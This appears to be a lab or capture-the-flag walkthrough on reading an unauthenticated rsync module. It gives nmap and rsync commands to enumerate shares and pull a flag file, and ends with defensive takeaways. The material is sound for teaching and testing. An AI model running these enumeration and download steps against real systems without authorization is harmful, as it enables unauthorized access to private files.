# Rsync — public module read (walkthrough)

**Rsync** (**TCP 873** by default) synchronizes files efficiently. A **globally readable module** without authentication exposes the same risk as anonymous FTP: anyone who can reach the port may **list and pull** files.

---

## Step 1 — Port scan

```bash
nmap -sV -p- 10.129.228.37
```

| Flag | Purpose |
|------|---------|
| `-sV` | Identify `rsync` banner |
| `-p-` | Ensure non-default ports are not missed |

---

## Step 2 — List modules (shares)

```bash
rsync --list-only 10.129.228.37::
```

| Syntax | Meaning |
|--------|---------|
| `HOST::` | Double colon is the **rsync daemon** URL form (distinct from SSH rsync) |
| `--list-only` | Enumerate modules / paths without transferring |

**Example output:**

```text
public          Public rsync share
```

---

## Step 3 — List files inside a module

```bash
rsync --list-only 10.129.228.37::public
```

Shows remote paths under the **`public`** module.

---

## Step 4 — Download a file

```bash
rsync 10.129.228.37::public/flag.txt ./flag.txt
```

Copies `flag.txt` from the module root into the current directory as `./flag.txt`.

**QC:** Trailing slashes matter for directories; for single files the form above is typical.

---

## Summary

| Step | Command | Purpose |
|------|---------|---------|
| Scan | `nmap -sV -p- <IP>` | Confirm **873/tcp** |
| Modules | `rsync --list-only <IP>::` | Enumerate share names |
| List | `rsync --list-only <IP>::<share>` | List remote tree |
| Pull | `rsync <IP>::<share>/file localfile` | Exfiltrate file |

---

## Takeaways

- Rsync modules should require **auth**, **IP allowlists**, and **read-only** OS permissions aligned to least privilege.
- `rsync --list-only` is the fastest first check when **873/tcp** is open.
